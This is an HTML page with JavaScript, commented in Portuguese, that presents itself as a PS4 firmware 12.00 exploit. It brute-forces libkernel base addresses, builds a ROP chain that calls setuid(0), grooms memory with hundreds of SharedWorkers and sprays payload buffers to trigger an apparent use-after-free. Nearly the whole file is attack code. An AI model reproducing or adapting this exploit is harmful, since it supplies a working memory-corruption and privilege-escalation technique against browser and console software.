<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 Smart Brute</title>
   
</head>
<body>

    <h1>PS4 12.00 - SMART BRUTEFORCE</h1>
    <h3>Encontre a Base da LibKernel</h3>
    
    <label>Selecione a Base para testar:</label><br>
    <select id="base_selector"></select>
    <br>
    <button onclick="run_exploit()">DISPARAR ATAQUE</button>

    <div id="log"></div>

    <script>
        function log(msg) {
            var d = document.getElementById("log");
            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. LISTA DE BASES PROVÁVEIS (Estatística PS4/FreeBSD)
        // =================================================================
        var POSSIBLE_BASES = [
            "0x800000000", // Padrão clássico
            "0x200000000", // Mapping base
            "0x880000000", // Variação comum
            "0x900000000", // High memory
            "0x800004000", // Offset pequeno
            "0x800010000", // Offset médio
            "0x820000000",
            "0x920000000",
            "0x1000000000",
            "0x800400000",
            "0x801000000"
        ];

        // Seus Offsets Extraídos (NÃO MUDE ISSO, ESTÃO CERTOS)
        var OFFSETS = {
            pop_rdi: 0x2FEB5,
            sys_mmap: 0x7500,
            sys_setuid: 0x4840
        };

        // =================================================================
        // 2. CONFIGURAÇÃO DA UI
        // =================================================================
        window.onload = function() {
            var sel = document.getElementById("base_selector");
            POSSIBLE_BASES.forEach((base, index) => {
                var opt = document.createElement("option");
                opt.value = base;
                opt.text = `Tentativa #${index}: ${base}`;
                sel.add(opt);
            });
            
            // Tenta recuperar a última tentativa do armazenamento local
            var last = localStorage.getItem("last_base_index");
            if(last) sel.selectedIndex = parseInt(last) + 1; // Pula para o próximo
        }

        // =================================================================
        // 3. CONSTRUTOR DE PAYLOAD (ROP)
        // =================================================================
        function build_payload(base_str) {
            var base = BigInt(base_str);
            var size = 0x400; // Tamanho estável
            var buffer = new Uint32Array(size / 4);
            var view = new DataView(buffer.buffer);

            // Cálcula endereços ABSOLUTOS usando a base chutada
            var addr_pop_rdi = base + BigInt(OFFSETS.pop_rdi);
            var addr_setuid = base + BigInt(OFFSETS.sys_setuid); // Vamos tentar virar root primeiro (mais simples)

            // --- ROP CHAIN SIMPLES (SETUID 0) ---
            // Se funcionar, o console NÃO deve crashar, e teoricamente ganhamos permissões.
            // Se o endereço estiver errado -> Crash.
            
            // Layout: Fake Vtable no inicio apontando para o gadget
            // 1. Encher o buffer com o endereço do POP RDI
            // Isso garante que qualquer pulo para cá inicie a chain
            for(var i=0; i < 64; i+=8) {
                view.setBigUint64(i, addr_pop_rdi, true);
            }

            // 2. Argumento para setuid(0)
            // A stack (RSP) estará logo após o gadget.
            // POP RDI vai pegar o próximo valor.
            view.setBigUint64(64, 0n, true); // RDI = 0 (Root)

            // 3. Chamada da Syscall
            view.setBigUint64(72, addr_setuid, true); 

            // 4. Loop Infinito (Para congelar em caso de sucesso)
            // Se chegarmos aqui, o ROP funcionou.
            // Como não temos endereço de loop, vamos crashar de propósito em 0x0
            view.setBigUint64(80, 0n, true); 

            return buffer;
        }

        // =================================================================
        // 4. EXECUÇÃO
        // =================================================================
        var workers = [];

        async function run_exploit() {
            var sel = document.getElementById("base_selector");
            var current_base = sel.value;
            
            // Salva para a próxima vez (se der panic, você sabe onde parou)
            localStorage.setItem("last_base_index", sel.selectedIndex);

            log(`Iniciando teste com BASE: <span class='highlight'>${current_base}</span>`);
            
            var payload = build_payload(current_base);

            // GROOMING (400)
            for(let i=0; i<400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
            }

            // PRESSÃO (404)
            var p_count = 0;
            var it = setInterval(() => {
                if(p_count >= 4) {
                    clearInterval(it);
                    
                    log("!!! DISPARANDO !!!");
                    var v = workers.pop();
                    v.port.close();
                    
                    var spray = [];
                    for(var k=0; k<10000; k++) {
                        spray.push(new Uint32Array(payload));
                    }
                    
                    // Trigger
                    try { v.port.postMessage("ROP_TEST"); } catch(e){}
                    
                    log("Aguardando... Se desligar, tente a próxima base na lista.");
                    return;
                }
                
                let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
                w.port.start();
                workers.push(w);
                p_count++;
            }, 150);
        }
    </script>
</body>
</html>
